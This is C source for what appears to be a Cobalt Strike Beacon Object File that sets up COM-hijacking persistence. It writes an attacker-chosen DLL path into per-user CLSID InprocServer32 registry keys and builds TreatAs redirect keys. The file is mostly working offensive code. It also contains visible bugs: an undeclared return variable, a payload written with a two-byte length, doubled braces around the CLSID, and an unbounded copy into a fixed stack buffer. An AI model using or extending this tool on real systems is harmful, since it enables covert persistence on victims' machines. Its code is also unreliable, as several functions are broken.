#include "bofdefs.h"
#include <stdio.h>
#include <string.h>

#define MAX_PATH 260

typedef struct {
    char* inprocServerPath;
    char* localServerPath;
} RegistryKeys;

char* FormatClsid(char clsid[]) {
    if (clsid == NULL || *clsid == '\0') {
        // Handle NULL or empty input
        return NULL;
    }

    char temp[MAX_PATH];
    char *start = temp;
    char *end = clsid;

    while (*end) {
        if (*end != '{' && *end != '}') {
            *start++ = *end;
        }
        end++;
    }
    *start = '\0'; // Null terminate

    // Allocate memory for the formatted string
    char *formattedClsid = malloc(strlen(temp) + 1); // Allocate just enough space
    if (!formattedClsid) {
        // Handle memory allocation failure
        return NULL;
    }

    // Use strcpy to copy the formatted string
    strcpy(formattedClsid, temp);

    return formattedClsid;
}

void CreateRegistryCU(char* regisrtyKey, char* payload) {
    char computer[] = "Computer";
    HKEY hHKCU = NULL;
    HKEY hSubKey = NULL;
    LSTATUS lRes;
    char szValue[1024];
    DWORD dwSize = sizeof(szValue);
    DWORD dwType = REG_SZ;

    lRes = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER , "", 0, KEY_READ | KEY_CREATE_SUB_KEY, &hHKCU);
    if (lRes == ERROR_SUCCESS) {
            lRes = ADVAPI32$RegCreateKeyExA(hHKCU, regisrtyKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_SET_VALUE , NULL, &hSubKey, NULL);
            if(lRes == ERROR_SUCCESS){
                lRes = ADVAPI32$RegSetValueExA(hSubKey, "", 0, REG_SZ, (LPBYTE)payload, 2);
                if(lRes == ERROR_SUCCESS){
                    lRes = ADVAPI32$RegSetValueExA(hSubKey, "ThreadingModel", 0, REG_SZ, (LPBYTE)"Both", 6);
                    if(lRes == ERROR_SUCCESS){
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry Key Path: %s\\%s\n", computer, regisrtyKey);
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry Key Value: %s\n\n", payload);
                    } else {
                        BeaconPrintf(CALLBACK_ERROR, "[-] Error Setting SubKey Value: %d\n\n", KERNEL32$GetLastError());
                        goto cleanup;
                    }
                } else {
                    BeaconPrintf(CALLBACK_ERROR, "[-] Error Setting SubKey Value: %d\n\n", KERNEL32$GetLastError());
                    goto cleanup;
                }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Error Creating Registry Key: %d\n\n", KERNEL32$GetLastError());
            goto cleanup;
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error Openning HKCU: %d\n\n", KERNEL32$GetLastError());
    }
    
    cleanup:
    if(hHKCU != NULL){
        ADVAPI32$RegCloseKey(hHKCU);
    }
    if(hSubKey != NULL){
        ADVAPI32$RegCloseKey(hSubKey);
    }
}

void CreateTreatAsRegistryCU(char* regisrtyKey, char* payload){
    char computer[] = "Computer";
    HKEY hHKCU = NULL;
    HKEY hSubKey = NULL;
    LSTATUS lRes;
    char szValue[1024];
    DWORD dwSize = sizeof(szValue);
    DWORD dwType = REG_SZ;

    lRes = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER , "", 0, KEY_READ | KEY_CREATE_SUB_KEY, &hHKCU);
    if (lRes == ERROR_SUCCESS) {
        lRes = ADVAPI32$RegCreateKeyExA(hHKCU, regisrtyKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_SET_VALUE , NULL, &hSubKey, NULL);
        if(lRes == ERROR_SUCCESS) {
            lRes = ADVAPI32$RegSetValueExA(hSubKey, "", 0, REG_SZ, (LPBYTE)payload, 2);
            if(lRes == ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry Key Path: %s\\%s\n", computer, regisrtyKey);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry Key Value: %s\n\n", payload);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Error Setting SubKey Value: %d\n\n", KERNEL32$GetLastError());
                goto cleanup;
            }
        } else{
            BeaconPrintf(CALLBACK_ERROR, "[-] Error Creating Registry Key: %d\n\n", KERNEL32$GetLastError());
            goto cleanup;
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error Openning HKCU: %d\n\n", KERNEL32$GetLastError());
    }

    cleanup:
    if(hHKCU != NULL){
        ADVAPI32$RegCloseKey(hHKCU);
    }
    if(hSubKey != NULL){
        ADVAPI32$RegCloseKey(hSubKey);
    }
}

RegistryKeys BuildRegistryKey(char* clsid){
    RegistryKeys rKeys = {0};
    char* cleanedCLSID = FormatClsid(clsid);

    if (cleanedCLSID == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to format CLSID.\n");
        return rKeys;
    }

    // Calculate the total length needed for the formatted CLSID
    size_t totalLength = strlen(cleanedCLSID) + 4; // 4 for the brackets {{}}
    
    // Allocate memory for the formatted CLSID
    char* formattedClSID = (char*)malloc(totalLength + 1); // +1 for the null terminator

    // Format the CLSID using snprintf
    snprintf(formattedClSID, totalLength + 1, "{{%s}}", cleanedCLSID);
    BeaconPrintf(CALLBACK_OUTPUT, "CLSID: %s\n", formattedClSID);

    //Alloc enough memory
    rKeys.inprocServerPath = (char*)malloc(MAX_PATH);
    rKeys.localServerPath = (char*)malloc(MAX_PATH);
    //Recreate the paths
    snprintf(rKeys.inprocServerPath, MAX_PATH, "SOFTWARE\\Classes\\CLSID\\%s\\", formattedClSID);
    strncat(rKeys.inprocServerPath, "InprocServer32", 15);
    BeaconPrintf(CALLBACK_OUTPUT, "InprocServer32: %s\n", rKeys.inprocServerPath);

    // Clean up before returning
    free(cleanedCLSID);
    free(formattedClSID);

    return rKeys;
}

char* BuildTreatAsKey(char* clsid){
    char* cleanedCLSID = FormatClsid(clsid);

    if (cleanedCLSID == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to format CLSID.\n");
        return rKeys;
    }
    // Calculate the total length needed for the formatted CLSID
    size_t totalLength = strlen(cleanedCLSID) + 4; // 4 for the brackets {{}}
    
    // Allocate memory for the formatted CLSID
    char* formattedClSID = (char*)malloc(totalLength + 1); // +1 for the null terminator

    // Format the CLSID using snprintf
    snprintf(formattedClSID, totalLength + 1, "{{%s}}", cleanedCLSID);
    BeaconPrintf(CALLBACK_OUTPUT, "CLSID: %s\n", formattedClSID);

    char* treatAs = (char*)malloc(MAX_PATH);
    snprintf(treatAs, MAX_PATH, "SOFTWARE\\Classes\\CLSID\\%s\\TreatAs", formattedClSID);
    
    // Clean up before returning
    free(cleanedCLSID);
    free(formattedClSID);
    
    return treatAs;
}